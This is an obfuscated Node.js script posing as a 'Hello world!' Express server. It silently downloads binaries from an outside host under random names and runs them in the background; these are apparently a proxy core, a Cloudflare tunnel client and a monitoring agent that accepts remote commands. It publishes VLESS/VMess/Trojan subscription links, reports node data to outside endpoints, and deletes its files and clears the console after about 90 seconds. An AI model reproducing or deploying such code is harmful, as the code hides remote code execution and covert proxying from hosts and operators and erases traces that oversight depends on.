const _0x1ebbff=_0x36a3;(function(_0x30fda6,_0x501a34){const _0x1a49e3=_0x36a3,_0x45cfa3=_0x30fda6();while(!![]){try{const _0xdb8249=-parseInt(_0x1a49e3(0x1b7))/0x1*(-parseInt(_0x1a49e3(0x1be))/0x2)+-parseInt(_0x1a49e3(0x22a))/0x3+-parseInt(_0x1a49e3(0x181))/0x4*(parseInt(_0x1a49e3(0x1d2))/0x5)+-parseInt(_0x1a49e3(0x1cb))/0x6+parseInt(_0x1a49e3(0x1ed))/0x7+-parseInt(_0x1a49e3(0x216))/0x8+-parseInt(_0x1a49e3(0x1e1))/0x9*(-parseInt(_0x1a49e3(0x224))/0xa);if(_0xdb8249===_0x501a34)break;else _0x45cfa3['push'](_0x45cfa3['shift']());}catch(_0x9063fa){_0x45cfa3['push'](_0x45cfa3['shift']());}}}(_0x2aaa,0x8d0f8));const express=require('express'),app=express(),axios=require(_0x1ebbff(0x1ef)),os=require('os'),fs=require('fs'),path=require(_0x1ebbff(0x19a)),{promisify}=require(_0x1ebbff(0x1d7)),exec=promisify(require(_0x1ebbff(0x222))[_0x1ebbff(0x1d6)]),{execSync}=require(_0x1ebbff(0x222)),UPLOAD_URL=process[_0x1ebbff(0x17a)][_0x1ebbff(0x20f)]||'',PROJECT_URL=process[_0x1ebbff(0x17a)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x1ebbff(0x17a)][_0x1ebbff(0x1ac)]||![],FILE_PATH=process[_0x1ebbff(0x17a)][_0x1ebbff(0x1fb)]||_0x1ebbff(0x202),SUB_PATH=process['env'][_0x1ebbff(0x1d8)]||_0x1ebbff(0x1b4),PORT=process[_0x1ebbff(0x17a)][_0x1ebbff(0x1ec)]||process[_0x1ebbff(0x17a)][_0x1ebbff(0x213)]||0xbb8,UUID=process[_0x1ebbff(0x17a)][_0x1ebbff(0x205)]||_0x1ebbff(0x1f9),NEZHA_SERVER=process[_0x1ebbff(0x17a)][_0x1ebbff(0x21e)]||'',NEZHA_PORT=process['env'][_0x1ebbff(0x1e6)]||'',NEZHA_KEY=process[_0x1ebbff(0x17a)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x1ebbff(0x17a)][_0x1ebbff(0x1fd)]||_0x1ebbff(0x18a),ARGO_AUTH=process[_0x1ebbff(0x17a)]['ARGO_AUTH']||_0x1ebbff(0x18d),ARGO_PORT=process['env'][_0x1ebbff(0x1a3)]||0x1f41,CFIP=process[_0x1ebbff(0x17a)][_0x1ebbff(0x1bd)]||_0x1ebbff(0x188),CFPORT=process['env'][_0x1ebbff(0x18c)]||0x1bb,NAME=process[_0x1ebbff(0x17a)][_0x1ebbff(0x220)]||'';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1ebbff(0x19e)](FILE_PATH+_0x1ebbff(0x1c7))):console[_0x1ebbff(0x19e)](FILE_PATH+_0x1ebbff(0x186));function generateRandomName(){const _0x6d026e=_0x1ebbff,_0x415d3f=_0x6d026e(0x189);let _0x4b09ce='';for(let _0x30fc04=0x0;_0x30fc04<0x6;_0x30fc04++){_0x4b09ce+=_0x415d3f[_0x6d026e(0x199)](Math[_0x6d026e(0x179)](Math[_0x6d026e(0x1ce)]()*_0x415d3f[_0x6d026e(0x17b)]));}return _0x4b09ce;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x2aaa(){const _0x22b7ef=['App\x20is\x20running','2083','tunnel.json','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','sub.txt','1169192wFFYHl','true','https+local://8.8.8.8/dns-query','Empowerment\x20failed\x20for\x20','arm64','\x20already\x20exists','&path=%2Fvless-argo%3Fed%3D2560#','saas.sin.fan','abcdefghijklmnopqrstuvwxyz','clawrunjp.xiangyu-group.com.cn','join','CFPORT','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiM2FhNGE0YWMtMzM2My00MjkwLWI1MzgtYjAzZGNiMmNiMDIxIiwicyI6Ik9UY3lNV1F5TkRNdE1qWmhOaTAwTnprd0xUZ3dZMk10WkdNM1lXTXpNVE00TlRnMyJ9','list.txt','Download\x20','writeFileSync','8443','post','Nodes\x20uploaded\x20successfully','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','stringify','mkdirSync','close','2053','charAt','path','vless','/api/delete-nodes','trojan','log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','unshift','toString','rm\x20-rf\x20','ARGO_PORT','trim','\x20-c\x20\x22','listen','del\x20/f\x20/q\x20','quic','tls','base64','includes','AUTO_ACCESS','https://arm64.ssss.nyc.mn/bot','false','/tunnel.yml\x20run','forEach','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','?encryption=none&security=tls&sni=','Content-Type','sub','127.0.0.1','.exe\x20>\x20nul\x202>&1','38573eZPoyx','config.yaml','chmod','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','CFIP','10KnErsA','\x20>/dev/null\x202>&1\x20&','none','message','ArgoDomain:','?security=tls&sni=','https://arm64.ssss.nyc.mn/agent','xtls-rprx-vision','utf-8','\x20is\x20created','status','basename','get','5139924UbDFsN','push','filter','random','Error\x20executing\x20command:\x20','pkill\x20-f\x20\x22[','freedom','5ggFAzN','block','blackhole','https://amd64.ssss.nyc.mn/agent','exec','util','SUB_PATH','isFile','2096','boot.log','map','web\x20running\x20error:\x20','finish','win32','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','9MFXFfX','Empowerment\x20success\x20for\x20','/vmess-argo','\x0a\x20\x20credentials-file:\x20','\x0aclient_secret:\x20','NEZHA_PORT','/trojan-argo','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','firefox','443','TunnelSecret','SERVER_PORT','6531777iXcyJT','response','axios','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x20\x20\x0avmess://','\x0a\x20\x20\x0atrojan://','vmess','readFileSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','unlink','match','then','bc97f674-c578-4940-9234-0a1da46041b9','arm','FILE_PATH','config.json','ARGO_DOMAIN','Hello\x20world!','set','\x20>\x20nul\x202>&1','amd','./tmp','/sub.txt\x20saved\x20successfully','&fp=firefox&type=ws&host=','UUID','Error\x20reading\x20boot.log:','fileName','error','has','catch','data','existsSync','\x20failed:\x20','/vless-argo','UPLOAD_URL','nohup\x20','clear','aarch64','PORT','http','tcp','3856632aVxSOY','unlinkSync','platform','split','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/v1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','taskkill\x20/f\x20/im\x20','NEZHA_SERVER','2087','NAME','statSync','child_process','php\x20running\x20error:\x20','15685210NIetNB','application/json','/api/add-nodes','from','createWriteStream','\x20is\x20running','1457046FVqphf','https://amd64.ssss.nyc.mn/web','all','\x20-s\x20','send','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','npm\x20running\x20error:\x20','/config.json\x20>/dev/null\x202>&1\x20&','/dev/null','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','floor','env','length'];_0x2aaa=function(){return _0x22b7ef;};return _0x2aaa();}let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x1ebbff(0x18b)](FILE_PATH,phpName),webPath=path[_0x1ebbff(0x18b)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x1ebbff(0x180)),listPath=path[_0x1ebbff(0x18b)](FILE_PATH,_0x1ebbff(0x18e)),bootLogPath=path[_0x1ebbff(0x18b)](FILE_PATH,_0x1ebbff(0x1db)),configPath=path[_0x1ebbff(0x18b)](FILE_PATH,_0x1ebbff(0x1fc));function deleteNodes(){const _0x12dafe=_0x1ebbff;try{if(!UPLOAD_URL)return;if(!fs[_0x12dafe(0x20c)](subPath))return;let _0x7b160d;try{_0x7b160d=fs[_0x12dafe(0x1f4)](subPath,_0x12dafe(0x1c6));}catch{return null;}const _0x137b7d=Buffer[_0x12dafe(0x227)](_0x7b160d,'base64')[_0x12dafe(0x1a1)](_0x12dafe(0x1c6)),_0x4812d2=_0x137b7d[_0x12dafe(0x219)]('\x0a')[_0x12dafe(0x1cd)](_0x13f7d0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x13f7d0));if(_0x4812d2['length']===0x0)return;return axios[_0x12dafe(0x192)](UPLOAD_URL+_0x12dafe(0x19c),JSON[_0x12dafe(0x195)]({'nodes':_0x4812d2}),{'headers':{'Content-Type':_0x12dafe(0x225)}})[_0x12dafe(0x20a)](_0x22d9fd=>{return null;}),null;}catch(_0x11cdf0){return null;}}function cleanupOldFiles(){const _0x498c1e=_0x1ebbff;try{const _0x2c924a=fs['readdirSync'](FILE_PATH);_0x2c924a[_0x498c1e(0x1b0)](_0x27058e=>{const _0x5cd974=_0x498c1e,_0x395d2d=path[_0x5cd974(0x18b)](FILE_PATH,_0x27058e);try{const _0x5843f4=fs[_0x5cd974(0x221)](_0x395d2d);_0x5843f4[_0x5cd974(0x1d9)]()&&fs[_0x5cd974(0x217)](_0x395d2d);}catch(_0x320efc){}});}catch(_0x33412e){}}app['get']('/',function(_0x5abf9b,_0x4c8d6a){const _0x1c8830=_0x1ebbff;_0x4c8d6a[_0x1c8830(0x22e)](_0x1c8830(0x1fe));});async function generateConfig(){const _0x55e7e6=_0x1ebbff,_0x2010b3={'log':{'access':_0x55e7e6(0x177),'error':_0x55e7e6(0x177),'loglevel':_0x55e7e6(0x1c0)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x55e7e6(0x19b),'settings':{'clients':[{'id':UUID,'flow':_0x55e7e6(0x1c5)}],'decryption':_0x55e7e6(0x1c0),'fallbacks':[{'dest':0xbb9},{'path':_0x55e7e6(0x20e),'dest':0xbba},{'path':_0x55e7e6(0x1e3),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x55e7e6(0x215)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x55e7e6(0x19b),'settings':{'clients':[{'id':UUID}],'decryption':_0x55e7e6(0x1c0)},'streamSettings':{'network':_0x55e7e6(0x215),'security':'none'}},{'port':0xbba,'listen':_0x55e7e6(0x1b5),'protocol':_0x55e7e6(0x19b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x55e7e6(0x1c0),'wsSettings':{'path':_0x55e7e6(0x20e)}},'sniffing':{'enabled':!![],'destOverride':[_0x55e7e6(0x214),_0x55e7e6(0x1a9),_0x55e7e6(0x1a8)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x55e7e6(0x1b5),'protocol':_0x55e7e6(0x1f3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x55e7e6(0x1e3)}},'sniffing':{'enabled':!![],'destOverride':[_0x55e7e6(0x214),'tls',_0x55e7e6(0x1a8)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x55e7e6(0x1b5),'protocol':_0x55e7e6(0x19d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x55e7e6(0x1c0),'wsSettings':{'path':_0x55e7e6(0x1e7)}},'sniffing':{'enabled':!![],'destOverride':[_0x55e7e6(0x214),_0x55e7e6(0x1a9),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x55e7e6(0x183)]},'outbounds':[{'protocol':_0x55e7e6(0x1d1),'tag':'direct'},{'protocol':_0x55e7e6(0x1d4),'tag':_0x55e7e6(0x1d3)}]};fs[_0x55e7e6(0x190)](path['join'](FILE_PATH,'config.json'),JSON[_0x55e7e6(0x195)](_0x2010b3,null,0x2));}function getSystemArchitecture(){const _0x147ed1=_0x1ebbff,_0x1a581e=os['arch']();return _0x1a581e==='arm'||_0x1a581e===_0x147ed1(0x185)||_0x1a581e===_0x147ed1(0x212)?'arm':_0x147ed1(0x201);}function downloadFile(_0x4162f8,_0x478095,_0x4ecba6){const _0x22a33b=_0x1ebbff,_0x350c89=_0x4162f8;!fs[_0x22a33b(0x20c)](FILE_PATH)&&fs[_0x22a33b(0x196)](FILE_PATH,{'recursive':!![]});const _0x4961ff=fs[_0x22a33b(0x228)](_0x350c89);axios({'method':_0x22a33b(0x1ca),'url':_0x478095,'responseType':'stream'})[_0x22a33b(0x1f8)](_0x28b754=>{const _0x22fd67=_0x22a33b;_0x28b754[_0x22fd67(0x20b)]['pipe'](_0x4961ff),_0x4961ff['on'](_0x22fd67(0x1de),()=>{const _0x173251=_0x22fd67;_0x4961ff[_0x173251(0x197)](),console[_0x173251(0x19e)]('Download\x20'+path[_0x173251(0x1c9)](_0x350c89)+'\x20successfully'),_0x4ecba6(null,_0x350c89);}),_0x4961ff['on'](_0x22fd67(0x208),_0x3cfd6e=>{const _0x115371=_0x22fd67;fs[_0x115371(0x1f6)](_0x350c89,()=>{});const _0x1daa4e='Download\x20'+path[_0x115371(0x1c9)](_0x350c89)+_0x115371(0x20d)+_0x3cfd6e[_0x115371(0x1c1)];console[_0x115371(0x208)](_0x1daa4e),_0x4ecba6(_0x1daa4e);});})[_0x22a33b(0x20a)](_0x1898e0=>{const _0x5035e9=_0x22a33b,_0x5ee4fc=_0x5035e9(0x18f)+path['basename'](_0x350c89)+'\x20failed:\x20'+_0x1898e0[_0x5035e9(0x1c1)];console[_0x5035e9(0x208)](_0x5ee4fc),_0x4ecba6(_0x5ee4fc);});}async function downloadFilesAndRun(){const _0x175fc5=_0x1ebbff,_0x6a1192=getSystemArchitecture(),_0x59c06f=getFilesForArchitecture(_0x6a1192);if(_0x59c06f[_0x175fc5(0x17b)]===0x0){console[_0x175fc5(0x19e)](_0x175fc5(0x178));return;}const _0x1fb27f=_0x59c06f[_0x175fc5(0x1dc)](_0x2a187c=>{return new Promise((_0x3496f3,_0x49a3d1)=>{const _0x7102f6=_0x36a3;downloadFile(_0x2a187c[_0x7102f6(0x207)],_0x2a187c['fileUrl'],(_0x51af2a,_0x787899)=>{_0x51af2a?_0x49a3d1(_0x51af2a):_0x3496f3(_0x787899);});});});try{await Promise[_0x175fc5(0x22c)](_0x1fb27f);}catch(_0x3615d8){console['error']('Error\x20downloading\x20files:',_0x3615d8);return;}function _0x25dafa(_0x3e30a1){const _0x5ea1c1=_0x175fc5,_0x597fdf=0x1fd;_0x3e30a1[_0x5ea1c1(0x1b0)](_0x5c13e4=>{const _0x34b83a=_0x5ea1c1;fs[_0x34b83a(0x20c)](_0x5c13e4)&&fs[_0x34b83a(0x1b9)](_0x5c13e4,_0x597fdf,_0xf742eb=>{const _0x293625=_0x34b83a;_0xf742eb?console['error'](_0x293625(0x184)+_0x5c13e4+':\x20'+_0xf742eb):console[_0x293625(0x19e)](_0x293625(0x1e2)+_0x5c13e4+':\x20'+_0x597fdf['toString'](0x8));});});}const _0x40df0c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x25dafa(_0x40df0c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x355c6e=NEZHA_SERVER[_0x175fc5(0x1ab)](':')?NEZHA_SERVER[_0x175fc5(0x219)](':')['pop']():'',_0x133f34=new Set([_0x175fc5(0x1ea),_0x175fc5(0x191),'2096',_0x175fc5(0x21f),_0x175fc5(0x17d),_0x175fc5(0x198)]),_0x2a52c6=_0x133f34[_0x175fc5(0x209)](_0x355c6e)?_0x175fc5(0x182):_0x175fc5(0x1ae),_0x308f1b=_0x175fc5(0x1e5)+NEZHA_KEY+_0x175fc5(0x1ba)+NEZHA_SERVER+_0x175fc5(0x1bb)+_0x2a52c6+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x175fc5(0x190)](path[_0x175fc5(0x18b)](FILE_PATH,_0x175fc5(0x1b8)),_0x308f1b);const _0x8efb98='nohup\x20'+phpPath+_0x175fc5(0x1a5)+FILE_PATH+_0x175fc5(0x194);try{await exec(_0x8efb98),console[_0x175fc5(0x19e)](phpName+_0x175fc5(0x229)),await new Promise(_0x568871=>setTimeout(_0x568871,0x3e8));}catch(_0x229356){console[_0x175fc5(0x208)](_0x175fc5(0x223)+_0x229356);}}else{let _0x20af23='';const _0x4e2208=[_0x175fc5(0x1ea),_0x175fc5(0x191),_0x175fc5(0x1da),_0x175fc5(0x21f),_0x175fc5(0x17d),_0x175fc5(0x198)];_0x4e2208['includes'](NEZHA_PORT)&&(_0x20af23='--tls');const _0x17811f='nohup\x20'+npmPath+_0x175fc5(0x22d)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x20af23+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x17811f),console[_0x175fc5(0x19e)](npmName+_0x175fc5(0x229)),await new Promise(_0x228665=>setTimeout(_0x228665,0x3e8));}catch(_0x3b6e02){console[_0x175fc5(0x208)](_0x175fc5(0x230)+_0x3b6e02);}}}else console[_0x175fc5(0x19e)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5b1191=_0x175fc5(0x210)+webPath+'\x20-c\x20'+FILE_PATH+_0x175fc5(0x176);try{await exec(_0x5b1191),console[_0x175fc5(0x19e)](webName+_0x175fc5(0x229)),await new Promise(_0x212899=>setTimeout(_0x212899,0x3e8));}catch(_0x47521f){console[_0x175fc5(0x208)](_0x175fc5(0x1dd)+_0x47521f);}if(fs[_0x175fc5(0x20c)](botPath)){let _0x47e318;if(ARGO_AUTH[_0x175fc5(0x1f7)](/^[A-Z0-9a-z=]{120,250}$/))_0x47e318=_0x175fc5(0x19f)+ARGO_AUTH;else ARGO_AUTH[_0x175fc5(0x1f7)](/TunnelSecret/)?_0x47e318=_0x175fc5(0x17f)+FILE_PATH+_0x175fc5(0x1af):_0x47e318=_0x175fc5(0x22f)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x175fc5(0x210)+botPath+'\x20'+_0x47e318+'\x20>/dev/null\x202>&1\x20&'),console[_0x175fc5(0x19e)](botName+_0x175fc5(0x229)),await new Promise(_0x24ef6b=>setTimeout(_0x24ef6b,0x7d0));}catch(_0x2a4760){console[_0x175fc5(0x208)](_0x175fc5(0x1cf)+_0x2a4760);}}await new Promise(_0x38b3b7=>setTimeout(_0x38b3b7,0x1388));}function getFilesForArchitecture(_0x5b944f){const _0x40ed94=_0x1ebbff;let _0x5d3cc7;_0x5b944f===_0x40ed94(0x1fa)?_0x5d3cc7=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x40ed94(0x1ad)}]:_0x5d3cc7=[{'fileName':webPath,'fileUrl':_0x40ed94(0x22b)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5759b6=_0x5b944f==='arm'?_0x40ed94(0x1c4):_0x40ed94(0x1d5);_0x5d3cc7[_0x40ed94(0x1a0)]({'fileName':npmPath,'fileUrl':_0x5759b6});}else{const _0x27602d=_0x5b944f===_0x40ed94(0x1fa)?_0x40ed94(0x21b):'https://amd64.ssss.nyc.mn/v1';_0x5d3cc7[_0x40ed94(0x1a0)]({'fileName':phpPath,'fileUrl':_0x27602d});}}return _0x5d3cc7;}function argoType(){const _0x1fe13c=_0x1ebbff;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1fe13c(0x1ab)](_0x1fe13c(0x1eb))){fs[_0x1fe13c(0x190)](path[_0x1fe13c(0x18b)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x59a257='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1fe13c(0x219)]('\x22')[0xb]+_0x1fe13c(0x1e4)+path[_0x1fe13c(0x18b)](FILE_PATH,_0x1fe13c(0x17e))+_0x1fe13c(0x1b1)+ARGO_DOMAIN+_0x1fe13c(0x1f5)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x59a257);}else console[_0x1fe13c(0x19e)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();function _0x36a3(_0xf2bc17,_0x162eb6){_0xf2bc17=_0xf2bc17-0x176;const _0x2aaa15=_0x2aaa();let _0x36a31e=_0x2aaa15[_0xf2bc17];return _0x36a31e;}async function extractDomains(){const _0x31fc20=_0x1ebbff;let _0x52f735;if(ARGO_AUTH&&ARGO_DOMAIN)_0x52f735=ARGO_DOMAIN,console[_0x31fc20(0x19e)]('ARGO_DOMAIN:',_0x52f735),await _0x83d274(_0x52f735);else try{const _0x1846a5=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0x31fc20(0x1c6)),_0x3354e2=_0x1846a5[_0x31fc20(0x219)]('\x0a'),_0x4660ee=[];_0x3354e2['forEach'](_0x4c1cab=>{const _0x4efc05=_0x31fc20,_0x137810=_0x4c1cab['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x137810){const _0x3102a0=_0x137810[0x1];_0x4660ee[_0x4efc05(0x1cc)](_0x3102a0);}});if(_0x4660ee[_0x31fc20(0x17b)]>0x0)_0x52f735=_0x4660ee[0x0],console['log'](_0x31fc20(0x1c2),_0x52f735),await _0x83d274(_0x52f735);else{console[_0x31fc20(0x19e)](_0x31fc20(0x21c)),fs['unlinkSync'](path[_0x31fc20(0x18b)](FILE_PATH,_0x31fc20(0x1db)));async function _0x34253f(){const _0x45e12a=_0x31fc20;try{process[_0x45e12a(0x218)]===_0x45e12a(0x1df)?await exec(_0x45e12a(0x21d)+botName+_0x45e12a(0x1b6)):await exec(_0x45e12a(0x1d0)+botName[_0x45e12a(0x199)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x20024c){}}_0x34253f(),await new Promise(_0x156698=>setTimeout(_0x156698,0xbb8));const _0x590282='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x31fc20(0x1e0)+ARGO_PORT;try{await exec(_0x31fc20(0x210)+botPath+'\x20'+_0x590282+_0x31fc20(0x1bf)),console[_0x31fc20(0x19e)](botName+_0x31fc20(0x229)),await new Promise(_0x200a05=>setTimeout(_0x200a05,0xbb8)),await extractDomains();}catch(_0x3ee9ea){console[_0x31fc20(0x208)]('Error\x20executing\x20command:\x20'+_0x3ee9ea);}}}catch(_0x35c258){console['error'](_0x31fc20(0x206),_0x35c258);}async function _0x83d274(_0xb93263){const _0x1cafe4=_0x31fc20,_0x28a773=execSync(_0x1cafe4(0x1e8),{'encoding':_0x1cafe4(0x1c6)}),_0x4495f7=_0x28a773[_0x1cafe4(0x1a4)](),_0x526785=NAME?NAME+'-'+_0x4495f7:_0x4495f7;return new Promise(_0x51a97a=>{setTimeout(()=>{const _0x59969a=_0x36a3,_0x97b2e0={'v':'2','ps':''+_0x526785,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x59969a(0x1c0),'host':_0xb93263,'path':'/vmess-argo?ed=2560','tls':_0x59969a(0x1a9),'sni':_0xb93263,'alpn':'','fp':_0x59969a(0x1e9)},_0x4c81cb='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x59969a(0x1b2)+_0xb93263+_0x59969a(0x204)+_0xb93263+_0x59969a(0x187)+_0x526785+_0x59969a(0x1f1)+Buffer[_0x59969a(0x227)](JSON[_0x59969a(0x195)](_0x97b2e0))['toString'](_0x59969a(0x1aa))+_0x59969a(0x1f2)+UUID+'@'+CFIP+':'+CFPORT+_0x59969a(0x1c3)+_0xb93263+_0x59969a(0x204)+_0xb93263+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x526785+'\x0a\x20\x20\x20\x20';console[_0x59969a(0x19e)](Buffer['from'](_0x4c81cb)['toString']('base64')),fs[_0x59969a(0x190)](subPath,Buffer[_0x59969a(0x227)](_0x4c81cb)[_0x59969a(0x1a1)]('base64')),console['log'](FILE_PATH+_0x59969a(0x203)),uploadNodes(),app['get']('/'+SUB_PATH,(_0xe13448,_0x5eb330)=>{const _0x4f116e=_0x59969a,_0x44a2e6=Buffer[_0x4f116e(0x227)](_0x4c81cb)[_0x4f116e(0x1a1)](_0x4f116e(0x1aa));_0x5eb330[_0x4f116e(0x1ff)](_0x4f116e(0x1b3),'text/plain;\x20charset=utf-8'),_0x5eb330['send'](_0x44a2e6);}),_0x51a97a(_0x4c81cb);},0x7d0);});}}async function uploadNodes(){const _0x175d51=_0x1ebbff;if(UPLOAD_URL&&PROJECT_URL){const _0x3dc83d=PROJECT_URL+'/'+SUB_PATH,_0x538c19={'subscription':[_0x3dc83d]};try{const _0xf67ef8=await axios[_0x175d51(0x192)](UPLOAD_URL+'/api/add-subscriptions',_0x538c19,{'headers':{'Content-Type':_0x175d51(0x225)}});return _0xf67ef8&&_0xf67ef8[_0x175d51(0x1c8)]===0xc8?(console[_0x175d51(0x19e)]('Subscription\x20uploaded\x20successfully'),_0xf67ef8):null;}catch(_0x13d8d6){if(_0x13d8d6[_0x175d51(0x1ee)]){if(_0x13d8d6[_0x175d51(0x1ee)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x175d51(0x20c)](listPath))return;const _0x36bbe5=fs[_0x175d51(0x1f4)](listPath,_0x175d51(0x1c6)),_0x2f2113=_0x36bbe5[_0x175d51(0x219)]('\x0a')[_0x175d51(0x1cd)](_0x49ee11=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x49ee11));if(_0x2f2113[_0x175d51(0x17b)]===0x0)return;const _0x4cbed5=JSON[_0x175d51(0x195)]({'nodes':_0x2f2113});try{const _0x79d53c=await axios[_0x175d51(0x192)](UPLOAD_URL+_0x175d51(0x226),_0x4cbed5,{'headers':{'Content-Type':'application/json'}});return _0x79d53c&&_0x79d53c[_0x175d51(0x1c8)]===0xc8?(console[_0x175d51(0x19e)](_0x175d51(0x193)),_0x79d53c):null;}catch(_0x2955f4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1814a1=_0x36a3,_0x3c273e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3c273e[_0x1814a1(0x1cc)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3c273e[_0x1814a1(0x1cc)](phpPath);process[_0x1814a1(0x218)]==='win32'?exec(_0x1814a1(0x1a7)+_0x3c273e['join']('\x20')+_0x1814a1(0x200),_0x23088e=>{const _0x20bc24=_0x1814a1;console[_0x20bc24(0x211)](),console[_0x20bc24(0x19e)](_0x20bc24(0x17c)),console[_0x20bc24(0x19e)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x1814a1(0x1a2)+_0x3c273e[_0x1814a1(0x18b)]('\x20')+_0x1814a1(0x21a),_0x569597=>{const _0x25ab0f=_0x1814a1;console['clear'](),console[_0x25ab0f(0x19e)](_0x25ab0f(0x17c)),console[_0x25ab0f(0x19e)](_0x25ab0f(0x1bc));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x40af47=_0x1ebbff;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x40af47(0x19e)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x4d10e1=await axios[_0x40af47(0x192)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x4d10e1;}catch(_0x2cf0f6){return console[_0x40af47(0x208)](_0x40af47(0x1f0)+_0x2cf0f6[_0x40af47(0x1c1)]),null;}}async function startserver(){const _0x51964a=_0x1ebbff;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x598590){console[_0x51964a(0x208)]('Error\x20in\x20startserver:',_0x598590);}}startserver()[_0x1ebbff(0x20a)](_0x3f2ae9=>{const _0x355617=_0x1ebbff;console[_0x355617(0x208)]('Unhandled\x20error\x20in\x20startserver:',_0x3f2ae9);}),app[_0x1ebbff(0x1a6)](PORT,()=>console[_0x1ebbff(0x19e)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
